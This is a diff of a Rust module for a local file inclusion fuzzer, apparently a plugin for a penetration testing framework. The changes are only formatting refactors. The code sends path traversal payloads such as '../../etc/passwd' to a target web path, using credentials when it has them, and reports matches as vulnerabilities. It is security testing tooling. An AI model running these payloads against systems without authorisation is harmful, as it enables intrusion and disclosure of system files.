@@ -53,18 +53,10 @@ impl NxcModule for LfiFuzzer {
             .ok_or_else(|| anyhow!("Module requires an HTTP session"))?;
 
         let scheme = if http_sess.use_ssl { "https" } else { "http" };
-        let base_path = opts
-            .get("PATH")
-            .ok_or_else(|| anyhow!("PATH is required"))?;
-        let url = format!(
-            "{}://{}:{}{}",
-            scheme, http_sess.target, http_sess.port, base_path
-        );
+        let base_path = opts.get("PATH").ok_or_else(|| anyhow!("PATH is required"))?;
+        let url = format!("{}://{}:{}{}", scheme, http_sess.target, http_sess.port, base_path);
 
-        info!(
-            "Starting LFI Fuzzing against target parameter block {}",
-            url
-        );
+        info!("Starting LFI Fuzzing against target parameter block {}", url);
 
         let payloads = vec![
             "../../../../../../../../../../etc/passwd",
@@ -81,7 +73,7 @@ impl NxcModule for LfiFuzzer {
         let mut test_success = false;
 
         for payload in payloads {
-            let test_url = format!("{}{}", url, payload);
+            let test_url = format!("{url}{payload}");
             let mut req = http_sess.client.get(&test_url);
 
             if let Some(creds) = &http_sess.credentials {
@@ -113,9 +105,9 @@ impl NxcModule for LfiFuzzer {
 
                     if found {
                         test_success = true;
-                        output.push_str(&format!("  [!] VULNERABLE to Path Traversal!\n"));
-                        output.push_str(&format!("      Payload: {}\n", payload));
-                        output.push_str(&format!("      Match  : {}\n", match_type));
+                        output.push_str("  [!] VULNERABLE to Path Traversal!\n");
+                        output.push_str(&format!("      Payload: {payload}\n"));
+                        output.push_str(&format!("      Match  : {match_type}\n"));
 
                         results.push(json!({
                             "payload": payload,
